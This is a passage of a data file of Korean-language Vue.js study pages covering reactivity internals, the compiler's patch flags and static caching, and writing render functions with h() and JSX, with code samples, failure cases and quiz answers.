(Proxy)                    그냥 대입\nㅍ 시그널 호출       count()                           undefined                       .value",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 반응성은 '프록시를 지나는 접근' 과 '그때의 activeEffect' 두 조건의 교집합이다",
        body: "구독이 기록되려면 둘이 동시여야 합니다. 접근이 Proxy(또는 ref의 getter)를 지나야 하고(ㄴ, ㄷ, ㄹ, ㅂ), 그 순간 activeEffect가 세워져 있어야 합니다(ㅁ, 동기 구간). 통지는 Proxy의 set/deleteProperty(ㅌ)가 trigger를 불러 큐에 모으고 묶어서 돌립니다. 저장소가 target·key 단위라 '무엇을 읽었나'가 '무엇에 반응하나'이고(ㄱ), 그래서 거대 객체의 깊은 Proxy는 비용이며 shallow·markRaw로 조절합니다(ㅇ, ㅅ). 같은 원본에 같은 프록시(캐시)라 정체 비교는 toRaw로 합니다(ㄴ). 시그널과 같은 원시 위에 풀림과 깊은 변환을 더한 것이 Vue의 선택이고(ㅍ), 컴파일 타임 반응성(Transform)은 폐기됐습니다(ㅋ). 처방은 '이 읽기가 프록시를 지나고 효과 안의 동기 구간인가'를 묻는 것입니다.",
        code: "기록 = (접근이 Proxy/getter 를 지남 ㄴ ㄷ ㄹ ㅂ) ∧ (그때 activeEffect 있음 = 효과의 동기 구간 ㅁ)\n       → targetMap: WeakMap<target, Map<key, Set<effect>>>   ('읽은 것 = 반응할 것' ㄱ)\n통지 = Proxy set/deleteProperty (ㅌ) → trigger → 큐 → 묶어서 effect()\n비용 = 깊은 Proxy → shallowRef · markRaw (ㅇ ㅅ)   ·   정체 = 같은 원본 같은 프록시 → toRaw (ㄴ)\nref = 시그널 + 풀림 (ㅍ) · 컴파일 타임 반응성은 폐기 (ㅋ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "반응성이 '무엇이 바뀌었나'를 알아낸 뒤 DOM을 어떻게 고치는지가 다음 페이지 '렌더링 메커니즘'입니다. 실제로 돌려 보면 컴파일 출력에 정적 캐시(-1)와 패치 플래그(TEXT·CLASS·KEYED_FRAGMENT)가 남아 있었습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) const state = reactive({ user: { name: 'a' } }); const user = state.user; user.name = 'b'. 화면이 바뀔까요? (2) 서드파티 상태 머신(XState)의 상태를 Vue에서 반응형으로 쓰려면? (3) 컴포넌트가 리렌더되는 이유를 운영에서 알고 싶습니다.",
        notes: [
          {
            title: "답",
            body: "(1) 바뀝니다. state.user를 읽으면 Proxy의 get이 중첩 객체를 다시 reactive로 감싸 돌려주므로(실제로 isReactive(state.nested) true) user는 프록시이고 user.name = 'b'는 그 프록시의 set을 지나 trigger됩니다. 끊기는 것은 원시값을 꺼낼 때(const { name } = state.user)입니다. (2) 상태 머신 객체는 자체 구독 모델이 있어 깊은 reactive로 감싸면 충돌하거나 비쌉니다. 문서의 레시피대로 const state = shallowRef(service.getSnapshot())을 두고 service.subscribe((s) => { state.value = s })로 외부 변화마다 .value를 교체합니다. shallowRef는 .value 교체만 추적하므로(실제로 깊은 변경은 안 돌고 교체는 돎) 외부 상태의 '스냅샷 교체' 모델과 맞습니다. @vueuse/rxjs도 같은 원리입니다. (3) onRenderTracked/onRenderTriggered는 개발 모드 전용이라 운영에서는 안 됩니다. 운영 재현이 필요하면 개발 빌드로 같은 데이터를 재현하거나, 의심 computed에 onTrigger(Composition API 전용, 개발)를 달아 로컬에서 봅니다. 운영에서는 Vue DevTools(프로파일링 빌드 플래그 __VUE_PROD_DEVTOOLS__)로 컴포넌트 렌더 타임라인을 보는 정도가 한계입니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Reactivity in Depth", href: `${DOCS}/guide/extras/reactivity-in-depth` },
      { label: "Reactivity API: Advanced", href: `${DOCS}/api/reactivity-advanced` },
      { label: "onRenderTracked() · onRenderTriggered()", href: `${DOCS}/api/composition-api-lifecycle#onrendertracked` },
    ],
  },

  {
    id: "vg-extra-rendering",
    name: "렌더링 메커니즘",
    tagline: "템플릿 → 렌더 함수 → vnode → DOM — 컴파일러가 남긴 패치 플래그와 정적 캐시로 비교를 건너뛴다",
    intro:
      "추가 주제 넷째 페이지입니다. Vue는 가상 DOM(plain 객체 vnode)을 씁니다. 파이프라인: 컴파일(템플릿 → 렌더 함수. 빌드 때 또는 런타임), 마운트(렌더 함수가 vnode 트리를 만들고 DOM 생성. 반응형 효과로 실행), 패치(의존이 바뀌면 다시 렌더해 옛·새 vnode 비교, 차이만 DOM에). 템플릿이 렌더 함수보다 권장되는 이유는 '정적 분석이 쉬워 컴파일러가 최적화할 수 있기 때문'. 컴파일러 정보 기반 가상 DOM 셋. 정적 캐시(정적 노드를 한 번 만들어 재사용, 연속 정적 노드는 innerHTML 문자열로), 패치 플래그(동적 노드마다 '무엇이 바뀔 수 있나'를 비트로. 1 TEXT, 2 CLASS, 8 PROPS, 64 STABLE_FRAGMENT, 128 KEYED_FRAGMENT…), 트리 평탄화(v-if·v-for가 만드는 블록이 동적 자손만 평탄한 배열로 추적해 정적 부분은 순회조차 안 함). SSR 하이드레이션에도 같은 정보로 빠른 경로. 실제로 돌려 보면 컴파일 출력에서 <p class=\"static\">은 _cache[2] || (_cache[2] = …, -1 /* CACHED */), <p :class=\"c\">{{ msg }}</p>는 3 /* TEXT, CLASS */, keyed v-for는 128 /* KEYED_FRAGMENT */, v-model input은 512 /* NEED_PATCH */, 컴포넌트는 8 /* PROPS */와 동적 props 목록 [\"title\", …], _openBlock()/_createElementBlock()이 블록을 만들었습니다. 이 노드의 질문은 하나입니다. 런타임은 무엇을 비교하고 무엇을 건너뛰나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "가상 DOM: { type: 'div', props: { id: 'hello' }, children: [] } 같은 plain 객체(vnode). 트리를 메모리에 두고 실제 DOM과 동기화. 마운트: vnode 트리를 순회해 DOM 생성. 패치: 새 트리를 옛 트리와 비교해 차이만 DOM에. 파이프라인: 컴파일(템플릿 → 렌더 함수. 빌드 또는 런타임) → 마운트(렌더 함수가 vnode 반환. 반응형 효과 안에서 실행해 의존 추적) → 패치(의존 변경 → 효과 재실행 → 새 vnode → diff). 템플릿 vs 렌더 함수: 템플릿은 HTML에 가깝고 '정적으로 분석하기 쉬워 컴파일러가 최적화'. 렌더 함수는 JS의 자유. 컴파일러 정보 기반 가상 DOM(하이브리드): 정적 캐시(Cache Static). 정적 노드는 처음 한 번 만들어 재사용(hoist/cache). 연속 정적 노드가 많으면 하나의 '정적 vnode'로 묶어 innerHTML로 삽입. 패치 플래그: 동적 바인딩이 있는 요소에 '이 요소는 class만 바뀜'(2 /* CLASS */)처럼 비트 플래그. 런타임은 그 플래그만 보고 비교. 'v-for 없는 자식 순서 안정'은 64 /* STABLE_FRAGMENT */. 트리 평탄화: v-if·v-for를 가진 템플릿 부분이 '블록'. 블록은 자기 안의 동적 자손만 평탄한 배열로 추적. 갱신 때 정적 부분은 순회하지 않고 그 배열만 봄. SSR 하이드레이션 영향: 패치 플래그로 단일 요소 빠른 경로, 블록 노드와 동적 자손만 순회('템플릿 수준 부분 하이드레이션').",
        code: "// 템플릿\n<div>\n  <div>foo</div>                        <!-- 정적 → 캐시 -->\n  <div :id=\"id\">bar</div>               <!-- 동적 id → 8 PROPS [\"id\"] -->\n  <div :class=\"{ active }\">{{ msg }}</div>   <!-- 3 TEXT | CLASS -->\n</div>\n\n// 렌더 함수 (개념)\nexport function render(_ctx, _cache) {\n  return (_openBlock(), _createElementBlock(\"div\", null, [          // 블록 — 동적 자손만 추적\n    _cache[0] || (_cache[0] = _createElementVNode(\"div\", null, \"foo\", -1 /* CACHED */)),\n    _createElementVNode(\"div\", { id: _ctx.id }, \"bar\", 8 /* PROPS */, [\"id\"]),\n    _createElementVNode(\"div\", { class: _normalizeClass({ active: _ctx.active }) }, _toDisplayString(_ctx.msg), 3 /* TEXT, CLASS */),\n  ]))\n}\n\n// 패치 플래그 (일부)\n1 TEXT · 2 CLASS · 4 STYLE · 8 PROPS · 16 FULL_PROPS · 64 STABLE_FRAGMENT · 128 KEYED_FRAGMENT · 256 UNKEYED_FRAGMENT · 512 NEED_PATCH · -1 CACHED(HOISTED) · -2 BAIL",
        terms: [
          {
            term: "패치 플래그 (patch flag)",
            body: "컴파일러가 동적 vnode에 붙이는 정수 비트 플래그로 '이 노드에서 바뀔 수 있는 것'을 적습니다. 런타임 patch는 플래그를 보고 그 부분만 비교합니다. TEXT(1)면 텍스트만, CLASS(2)면 class만, PROPS(8)면 함께 오는 동적 props 이름 배열만. 플래그가 없는(정적) 노드는 비교 자체를 건너뛰고, -1(CACHED)은 한 번 만든 vnode를 재사용합니다. 실제로 컴파일 출력에 3 /* TEXT, CLASS */, 128 /* KEYED_FRAGMENT */, 512 /* NEED_PATCH */가 보였습니다. JSX·수동 렌더 함수에는 이 정보가 없어 전체 diff가 됩니다.",
          },
          {
            term: "블록 (block)과 트리 평탄화",
            body: "구조가 바뀌지 않는 템플릿 조각(v-if·v-for 경계 안)을 블록이라 하고, 블록은 자기 안의 동적 노드만 평탄한 배열(dynamicChildren)로 모아 둡니다. 갱신 때 트리를 재귀 순회하지 않고 그 배열만 돌면 되어 정적 부분의 깊이가 비용에 영향을 주지 않습니다. v-if·v-for는 구조가 바뀌므로 자기 블록을 새로 열고, 부모 블록은 그것을 하나의 동적 자손으로 봅니다. 실제로 출력의 _openBlock()/_createElementBlock()이 그것입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node의 @vue/compiler-dom으로 <div><p class=\"static\">정적</p><p :class=\"c\">{{ msg }}</p><ul><li v-for=\"i in items\" :key=\"i\">{{ i }}</li></ul><input v-model.trim.number=\"v\"><Comp v-model:title=\"t\" @update:title.once=\"f\" /></div>를 컴파일했습니다(mode module, hoistStatic, cacheHandlers). 루트는 (_openBlock(), _createElementBlock(\"div\", null, [...])). 정적 <p>는 _cache[2] || (_cache[2] = _createElementVNode(\"p\", { class: \"static\" }, \"정적\", -1 /* CACHED */)). 동적 <p>는 { class: _normalizeClass(_ctx.c) }, _toDisplayString(_ctx.msg), 3 /* TEXT, CLASS */. <ul> 안 v-for는 (_openBlock(true), _createElementBlock(_Fragment, null, _renderList(_ctx.items, (i) => (_openBlock(), _createElementBlock(\"li\", { key: i }, _toDisplayString(i), 1 /* TEXT */))), 128 /* KEYED_FRAGMENT */)). v-model input은 _withDirectives(_createElementVNode(\"input\", { \"onUpdate:modelValue\": _cache[0] || (_cache[0] = $event => (_ctx.v = $event)) }, null, 512 /* NEED_PATCH */), [[_vModelText, _ctx.v, void 0, { trim: true, number: true }]]). 컴포넌트는 _createVNode(_component_Comp, { title: _ctx.t, \"onUpdate:title\": _cache[1] || …, \"onUpdate:titleOnce\": _ctx.f }, null, 8 /* PROPS */, [\"title\", \"onUpdate:titleOnce\"]). Chrome의 갱신 측정에서 같은 틱 세 변경이 렌더 1회로 묶이고(효과 스케줄), v-memo로 같은 값이면 서브트리를 건너뛰고, 자식 컴포넌트는 props가 같으면 렌더 0이었습니다. 하이드레이션은 텍스트 불일치만 경고하고 고쳤습니다.",
        code: "// @vue/compiler-dom 3.5.45 출력 (발췌)\n(_openBlock(), _createElementBlock(\"div\", null, [                                        // 블록\n  _cache[2] || (_cache[2] = _createElementVNode(\"p\", { class: \"static\" }, \"정적\", -1 /* CACHED */)),   // 정적 캐시\n  _createElementVNode(\"p\", { class: _normalizeClass(_ctx.c) }, _toDisplayString(_ctx.msg), 3 /* TEXT, CLASS */),\n  _createElementVNode(\"ul\", null, [\n    (_openBlock(true), _createElementBlock(_Fragment, null, _renderList(_ctx.items, (i) =>\n      (_openBlock(), _createElementBlock(\"li\", { key: i }, _toDisplayString(i), 1 /* TEXT */))), 128 /* KEYED_FRAGMENT */))\n  ]),\n  _withDirectives(_createElementVNode(\"input\", { \"onUpdate:modelValue\": _cache[0] || (_cache[0] = $event => ((_ctx.v) = $event)) }, null, 512 /* NEED_PATCH */), [[_vModelText, _ctx.v, void 0, { trim: true, number: true }]]),\n  _createVNode(_component_Comp, { title: _ctx.t, \"onUpdate:title\": _cache[1] || (…), \"onUpdate:titleOnce\": _ctx.f }, null, 8 /* PROPS */, [\"title\", \"onUpdate:titleOnce\"])\n]))",
      },
      {
        label: "문제: 'Vue 는 가상 DOM 이라 느리다' 는 주장",
        body: "'가상 DOM은 매 갱신에 트리 전체를 다시 만들고 비교하니 느리다'는 말은 수동 렌더 함수·JSX에는 맞지만 Vue 템플릿에는 절반만 맞습니다. 컴파일러가 템플릿을 정적으로 분석해 셋을 남깁니다. 정적 노드는 캐시해 다시 만들지도 비교하지도 않고(실제로 -1 CACHED), 동적 노드는 패치 플래그로 바뀔 수 있는 것만 비교하고(3 TEXT, CLASS), 블록이 동적 자손만 평탄 배열로 추적해 정적 부분은 순회조차 하지 않습니다(_openBlock). 문서가 이것을 '컴파일러 정보 기반 가상 DOM'이라 부르고, 템플릿을 렌더 함수보다 권장하는 이유입니다. 렌더 함수·JSX로 쓰면 이 정보가 없어 전체 diff가 됩니다. 성능이 중요하면 템플릿으로, 그리고 거대 리스트는 가상화로.",
      },
      {
        label: "문제가 나는 경우: 비교의 단위를 모를 때",
        body: "경우 ㄱ, 가상 DOM 오해입니다. 위의 사고입니다. 경우 ㄴ, 성능 민감 컴포넌트를 JSX로. 플래그 없음, 전체 diff. 템플릿. 경우 ㄷ, 정적 노드가 캐시된다고 믿고 큰 정적 HTML을 매 갱신 비용으로 걱정. 비용 없음. 경우 ㄹ, v-if/v-for를 블록 경계로 모르고 거대 트리 한 블록. 동적 자손 배열이 커짐. 컴포넌트로 쪼개기. 경우 ㅁ, key 없는 v-for. UNKEYED_FRAGMENT로 제자리 패치. key. 경우 ㅂ, v-bind=\"obj\" 전체 바인딩. FULL_PROPS로 전부 비교. 개별 바인딩. 경우 ㅅ, 런타임 컴파일(template 문자열)로 매번 컴파일. 빌드 때. 경우 ㅇ, 하이드레이션이 전체 DOM을 순회할 거라 걱정. 블록·플래그로 부분. 경우 ㅈ, 렌더 함수에서 vnode를 재사용. vnode는 유일해야. 팩토리. 경우 ㅊ, 컴포넌트가 props 같아도 리렌더될 거라 memo 추가. 자동 건너뜀(실제로 0). 경우 ㅋ, 수동 패치 플래그 기대. 컴파일러 전용. 경우 ㅌ, Vapor 모드가 지금 있다고 가정. 탐색 중.",
        code: "경우               언제 생기나                       겉모습                         처방\nㄱ 가상 DOM 오해     전체 diff 가정                     -                             컴파일러 정보 (캐시 · 플래그 · 블록)\nㄴ JSX 성능         민감 컴포넌트 JSX                   플래그 없음 · 전체 diff          템플릿\nㄷ 정적 걱정        큰 정적 HTML                       비용 없음 (-1 CACHED)           -\nㄹ 거대 블록        한 컴포넌트에 전부                  동적 배열 큼                     쪼개기\nㅁ key 없음        UNKEYED_FRAGMENT                  제자리 패치                      key\nㅂ 전체 바인딩       v-bind=\"obj\"                      FULL_PROPS                     개별\nㅅ 런타임 컴파일     template 문자열                     매번 컴파일                      빌드\nㅇ 수화 전체 순회 걱정  SSR                              부분 (블록·플래그)                -\nㅈ vnode 재사용      같은 vnode 둘                      무효                           팩토리\nㅊ 불필요 memo      props 같은 자식                     이미 건너뜀 (실제로 0)            -\nㅋ 수동 플래그       h() 에 플래그                      컴파일러 전용                     템플릿\nㅌ Vapor 가정       -                                탐색 중                         -",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 비교 비용은 '컴파일러가 미리 아는 만큼' 줄고, 모르는 것(렌더 함수)은 전부 비교한다",
        body: "런타임 패치의 비용은 '비교해야 하는 것의 수'입니다. 컴파일러는 템플릿을 보고 세 가지를 미리 압니다. 바뀌지 않는 것(정적 → 캐시 ㄷ), 바뀔 수 있는 것의 종류(플래그 → 그것만 비교 ㅂ), 구조가 안정한 범위(블록 → 동적 자손만 순회 ㄹ). 그래서 템플릿은 쓴 만큼이 아니라 '동적인 만큼'만 비용이 듭니다. 렌더 함수·JSX는 컴파일러가 안을 모르니 전체를 비교하고(ㄴ, ㅋ), 런타임 컴파일은 그 분석을 매번 합니다(ㅅ). 컴포넌트 경계는 또 하나의 건너뛰기(props 같으면 ㅊ)이고 key는 리스트의 짝짓기(ㅁ)입니다. 하이드레이션도 같은 정보로 부분만 봅니다(ㅇ). 처방은 성능이 중요한 자리를 템플릿으로 두고, 블록이 커지면 컴포넌트로 쪼개고, 리스트에 key를 주는 것입니다.",
        code: "패치 비용 = 비교할 것의 수\n컴파일러가 아는 것:  정적 (캐시 -1 → 비교 X ㄷ) · 플래그 (TEXT·CLASS·PROPS → 그것만 ㅂ) · 블록 (동적 자손만 순회 ㄹ)\n모르는 것:          렌더 함수 · JSX → 전체 diff (ㄴ ㅋ) · 런타임 컴파일 → 매번 분석 (ㅅ)\n또 하나의 건너뛰기:  컴포넌트 (props 같으면 ㅊ) · key (리스트 짝 ㅁ) · 하이드레이션도 부분 (ㅇ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "컴파일러 없이 렌더 함수를 직접 쓰는 법이 다음 페이지 '렌더 함수와 JSX'입니다. 이 블로그의 측정 코드가 전부 h()로 쓰였습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 긴 약관 HTML(정적 수천 줄)이 든 컴포넌트가 상태 하나 바뀔 때마다 느릴까요? (2) 1,000행 테이블의 각 셀에 :class·:style·텍스트가 동적입니다. 컴파일러가 무엇을 남기고 어디가 비용일까요? (3) 디자인 시스템을 JSX로 쓰자는 제안. 렌더링 관점의 트레이드오프는?",
        notes: [
          {
            title: "답",
            body: "(1) 아닙니다. 정적 노드는 -1 CACHED로 한 번 만들어 재사용되고 연속 정적 노드는 하나의 정적 vnode(innerHTML)로 묶여, 갱신 때 비교 대상이 아닙니다(실제로 _cache[n] || (…, -1)). 블록은 동적 자손만 추적하므로 약관 수천 줄은 순회조차 되지 않습니다. 상태 하나의 변경 비용은 그 상태를 쓰는 동적 노드 수에만 비례합니다. (2) 각 셀 요소에 플래그 TEXT|CLASS|STYLE(7)이 붙고 v-for는 KEYED_FRAGMENT 블록이 됩니다. 비용은 1,000 × 셀 수의 동적 노드를 매 갱신 비교하는 것이고, 어느 행의 상태가 바뀌든 그 블록 전체의 동적 자손을 돕니다. 처방은 행을 컴포넌트로 만들어(props가 같은 행은 통째로 건너뜀. 실제로 렌더 0) 경계를 두거나 v-memo로 행 서브트리를 건너뛰고, 보이는 행만 그리는 가상화입니다. (3) JSX는 컴파일러가 안을 분석하지 못해 패치 플래그·정적 캐시·블록이 없고 전체 diff가 됩니다(문서: 템플릿이 정적 분석에 유리). 표현의 자유(동적 구조·TS 제네릭)는 얻지만 갱신 성능과 SSR 하이드레이션 빠른 경로를 잃습니다. 디자인 시스템처럼 많이 쓰이는 컴포넌트는 템플릿으로 두고, 구조가 고도로 동적인 소수(렌더리스·레이아웃 엔진)만 렌더 함수로 쓰는 절충이 보통입니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Rendering Mechanism", href: `${DOCS}/guide/extras/rendering-mechanism` },
      { label: "Render Functions & JSX", href: `${DOCS}/guide/extras/render-function` },
      { label: "patchFlags.ts", href: "https://github.com/vuejs/core/blob/main/packages/shared/src/patchFlags.ts" },
    ],
  },

  {
    id: "vg-extra-render-fn",
    name: "렌더 함수와 JSX",
    tagline: "h(type, props, children) 로 vnode 를 직접 — 슬롯은 함수, 디렉티브는 withDirectives, 컴파일러 최적화는 없다",
    intro:
      "추가 주제 다섯째 페이지입니다. 템플릿 대신 JS로 vnode를 만드는 길입니다. h(type, props?, children?)('hyperscript'). vnode는 { type, props, children, key }이고 '그 외 프로퍼티에 의존하지 말 것'. setup이 렌더 함수를 반환(값이 아니라 함수를!). 'vnode는 유일해야'(같은 vnode를 둘 넣지 말고 팩토리로). JSX: Vue용 JSX는 React와 다르고(class·for 그대로) jsx: 'preserve' + jsxImportSource: 'vue'(3.4부터 전역 JSX 네임스페이스 없음). 템플릿 기능 대응: v-if → 삼항, v-for → map + key, v-on → onClick(수식어 onClickCapture·onKeyupOnce·withModifiers), 컴포넌트 → import해 h(Comp)(전역은 resolveComponent), 슬롯 → slots.default()와 { default: () => … }(null props 필수), 내장은 import, v-model → modelValue + 'onUpdate:modelValue', 디렉티브 → withDirectives(h(…), [[dir, value, arg, mods]]), 템플릿 ref → useTemplateRef('x')(3.5+). 함수형 컴포넌트는 props·emits를 함수 프로퍼티로. 이 블로그의 측정 코드가 전부 h()였습니다. 이 노드의 질문은 하나입니다. 템플릿의 각 기능이 JS로는 무엇인가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "h(type, props?, children?): import { h } from 'vue'; h('div', { id: 'foo' }, [h('span', 'hi')]). type은 태그 문자열·컴포넌트. props는 선택, children은 문자열·vnode·배열·슬롯 객체. vnode 모양 { type, props, children, key }. '여기 적힌 것 외의 프로퍼티에 의존하지 말 것'(경고). 선언: export default { setup() { return () => h('div', props.msg) } }. '값이 아니라 함수를 반환할 것'. Options는 render() 옵션. vnode 유일: const p = h('p'); h('div', [p, p])는 안 됨. 팩토리 () => h('p')로 둘 만들기. JSX: Vue JSX는 class·for 그대로(React의 className·htmlFor 아님). tsconfig jsx: 'preserve', jsxImportSource: 'vue'(3.4부터 전역 JSX 네임스페이스 미제공. 파일별 /* @jsxImportSource vue */도). 대응: v-if → ok ? h('div') : h('span'). v-for → items.map(({ id, text }) => h('li', { key: id }, text)). v-on → h('button', { onClick }). 수식어: .capture → onClickCapture, .once → onClickOnce, .passive → onClickPassive, .stop/.prevent/.self/.ctrl → withModifiers(fn, ['self']). 키 → onKeyup={e => e.key === 'Enter' && fn()}. 컴포넌트: import Foo; h(Foo). 전역 등록은 resolveComponent('Foo')(setup·render 안에서). 슬롯 받기: slots.default(), slots.footer({ text }). 슬롯 넘기기: h(MyComponent, null, { default: () => 'default slot', footer: (props) => h('div', props.text) })('props 자리 null 필수'). 범위 슬롯 데이터는 함수 인자. 내장: import { KeepAlive, Transition, … }. v-model: h(SomeComponent, { modelValue: props.modelValue, 'onUpdate:modelValue': (v) => emit('update:modelValue', v) }). 디렉티브: withDirectives(h('div'), [[pin, 200, 'top', { animate: true }]]), resolveDirective('pin'). 템플릿 ref: useTemplateRef('divEl')(3.5+. 그 전 ref()를 { ref: divEl }). 함수형 컴포넌트: function MyComp(props, { slots, emit, attrs }) { return h(…) }. MyComp.props = ['value']; MyComp.emits = ['click']. props 미선언이면 attrs 전부가 props. 기본으로 class·style·onXxx만 상속, inheritAttrs = false 가능. 타입: SetupContext<Events>, FunctionalComponent<Props, Events>.",
        code: "import { h, withDirectives, withModifiers, resolveComponent, useTemplateRef } from 'vue'\nimport MyComp from './MyComp.vue'\n\nexport default {\n  props: ['items', 'ok'], emits: ['pick'],\n  setup(props, { slots, emit }) {\n    const el = useTemplateRef('el')                               // 3.5+\n    const vPin = { mounted(el, b) {} }\n    return () => h('div', { ref: 'el', class: 'wrap' }, [       // 함수를 반환\n      props.ok ? h('p', 'yes') : h('span', 'no'),                // v-if\n      h('ul', props.items.map(i => h('li', { key: i.id, onClick: withModifiers(() => emit('pick', i.id), ['self']) }, i.text))),   // v-for · v-on.self\n      h(MyComp, { modelValue: props.v, 'onUpdate:modelValue': v => emit('update:v', v) }, {   // v-model · 슬롯 (props 자리 null 아님 — 여기선 props 있음)\n        default: () => slots.default?.(),                        // 슬롯 중계\n        footer: ({ text }) => h('footer', text),                 // 범위 슬롯\n      }),\n      withDirectives(h('div', 'pinned'), [[vPin, 200, 'top', { animate: true }]]),   // v-pin:top.animate=\"200\"\n      h(resolveComponent('GlobalBtn')),                          // 전역 등록 컴포넌트\n    ])\n  },\n}\n\n// 함수형 컴포넌트\nfunction Badge(props, { slots }) { return h('span', { class: ['badge', props.tone] }, slots.default?.()) }\nBadge.props = ['tone']\n\n// JSX (jsx: 'preserve' · jsxImportSource: 'vue') — class 그대로\nconst node = <div class=\"a\" onClick={fn}>{items.map(i => <li key={i.id}>{i.text}</li>)}</div>",
        terms: [
          {
            term: "h() (hyperscript)",
            body: "'HTML을 만드는 JavaScript'라는 뜻의 이름으로, vnode를 만드는 함수입니다. h(type, props, children). type은 'div' 같은 태그, 컴포넌트 객체, Fragment·Text 같은 특수 타입. props는 속성·이벤트(onXxx)·key·ref를 담은 객체. children은 문자열·vnode·배열, 컴포넌트면 슬롯 함수 객체. 템플릿은 결국 h() 호출(실제 출력은 _createElementVNode·_createVNode)로 컴파일되지만 거기엔 패치 플래그가 붙고 손으로 쓴 h()에는 없습니다. 이 블로그의 Node·브라우저 측정은 전부 h()로 작성했습니다.",
          },
          {
            term: "함수형 컴포넌트 (functional component)",
            body: "상태·인스턴스 없이 (props, { slots, emit, attrs }) → vnode인 보통 함수입니다. props·emits·inheritAttrs는 함수의 프로퍼티로 선언합니다. 인스턴스가 없어 가볍고, props를 선언하지 않으면 받은 속성 전부가 props로 들어오되 루트에 상속되는 것은 class·style·onXxx만입니다. 템플릿에서도 쓸 수 있고 Vue - Official이 타입 검사합니다. 로직 없는 표현 전용 컴포넌트에 맞습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면: 이 블로그의 측정이 전부 h() 였다",
        body: "Node와 Chrome의 측정 스크립트는 템플릿 없이 h()로 썼습니다. h(Suspense, null, { default: () => h(AsyncChild), fallback: () => h('i', '로딩…') })처럼 슬롯을 함수 객체로 넘겼고(props 자리 null), h(Teleport, { to: '#modal' }, h('span', '텔레포트')), h(KeepAlive, …), setup이 렌더 함수를 반환하는 defineComponent({ setup() { …; return () => h('p', …) } })를 썼습니다. 렌더 함수 안에서 resolveComponent('Nope')를 부르니 '[Vue warn]: Failed to resolve component: Nope'와 <Nope></Nope>. props 검증·emit·attrs 폴스루·inheritAttrs: false + h('input', attrs)도 h()로 확인했습니다. 컴파일된 템플릿의 출력(렌더링 메커니즘 노드)과 비교하면 같은 _createElementVNode 호출이되 손으로 쓴 h()에는 패치 플래그·캐시·블록이 없습니다. 디렉티브 측정은 템플릿의 v-dir이 _withDirectives(vnode, [[dir, value, arg, mods]])로 컴파일되는 것과 같은 꼴입니다(실제로 v-model이 그 꼴로 출력). vnode 객체는 { type, props, children, key, … }였고 문서는 그 넷 외에 의존하지 말라고 합니다.",
        code: "// 이 블로그의 측정 코드 꼴 (Node · Chrome)\nh(Suspense, null, { default: () => h(AsyncChild), fallback: () => h('i', '로딩…') })   // 슬롯 = 함수 객체 · props 자리 null\nh(Teleport, { to: '#modal' }, h('span', '텔레포트'))\ndefineComponent({ setup(props, { attrs, slots, emit }) { return () => h('button', { class: 'btn' }, [slots.default?.() ?? '폴백']) } })\nh(resolveComponent('Nope'))   → warn: Failed to resolve component: Nope · <Nope></Nope>\n\n// 컴파일된 템플릿과의 차이\n템플릿 → _createElementVNode(\"p\", {…}, …, 3 /* TEXT, CLASS */) · _cache · _openBlock     (플래그 · 캐시 · 블록)\n손 h()  → h('p', {…}, …)                                                                (없음 → 전체 diff)\n디렉티브: 템플릿 v-x → _withDirectives(vnode, [[_directive_x, value, arg, mods]])  ≡  손으로 withDirectives(…)",
      },
      {
        label: "문제: setup 에서 h() 결과를 바로 반환했더니 갱신이 안 된다",
        body: "setup() { return h('div', count.value) }로 썼습니다. 처음은 그려지는데 count가 바뀌어도 그대로입니다. setup은 한 번만 돌므로 반환된 vnode는 그 순간의 값으로 고정된 객체입니다. 문서의 경고 '값이 아니라 함수를 반환할 것'이 이 자리입니다. return () => h('div', count.value)로 함수를 돌려주면 Vue가 그 함수를 렌더 효과로 등록해 count를 읽는 순간 추적하고 바뀔 때 다시 부릅니다. 같은 이유로 vnode를 변수에 담아 두 번 쓰면(const p = h('p'); [p, p]) 안 되고 팩토리로 매번 만듭니다. 템플릿을 쓰면 컴파일러가 이 함수를 만들어 주므로 생길 수 없는 사고이고, 렌더 함수를 쓸 때만 조심합니다.",
      },
      {
        label: "문제가 나는 경우: 템플릿 대응을 틀릴 때",
        body: "경우 ㄱ, vnode 값 반환입니다. 위의 사고입니다. 경우 ㄴ, vnode 재사용. 무효. 팩토리. 경우 ㄷ, 슬롯을 자식 배열로 넘김. h(Comp, null, [h('p')])는 default 슬롯이 되지만 범위·이름 슬롯은 함수 객체. 경우 ㄹ, 슬롯 객체를 둘째 인자에. props로 해석. null 뒤 셋째. 경우 ㅁ, React JSX 습관 className·htmlFor. Vue는 class·for. 경우 ㅂ, jsxImportSource 미설정(3.4+). 전역 JSX 네임스페이스 없음. 'vue'. 경우 ㅅ, 전역 등록 컴포넌트를 문자열로 h('MyComp'). 네이티브 요소로. resolveComponent. 경우 ㅇ, 내장 컴포넌트를 import 없이. 템플릿에서만 자동. import { Transition }. 경우 ㅈ, 수식어를 문자열로. onClick.stop 없음. withModifiers·onClickCapture. 경우 ㅊ, v-model을 modelValue만 넘김. update 이벤트 없어 한 방향. 'onUpdate:modelValue'. 경우 ㅋ, 디렉티브를 props에 { 'v-pin': … }. 무시. withDirectives. 경우 ㅌ, 함수형 컴포넌트에 props 선언 없이 attrs 전부가 props가 되어 루트에 안 상속. props 선언 또는 inheritAttrs. 경우 ㅍ, 성능 민감 컴포넌트를 렌더 함수로. 플래그 없음. 템플릿.",
        code: "경우               언제 생기나                        겉모습                          처방\nㄱ 값 반환         setup() { return h(…) }             갱신 안 됨                       return () => h(…)\nㄴ vnode 재사용     const p = h('p'); [p, p]            무효                            () => h('p')\nㄷ 슬롯 배열        h(Comp, null, [vnode])               default 만 · 범위 불가             { default: () => … }\nㄹ 슬롯 자리        h(Comp, { default })                props 로 해석                     h(Comp, null, { default })\nㅁ React 습관       className · htmlFor                 안 먹음                          class · for\nㅂ JSX 소스        jsxImportSource 없음                 타입 에러 (3.4+)                   'vue'\nㅅ 문자열 컴포넌트    h('MyComp')                         네이티브 요소 + 경고               resolveComponent · import\nㅇ 내장 미import    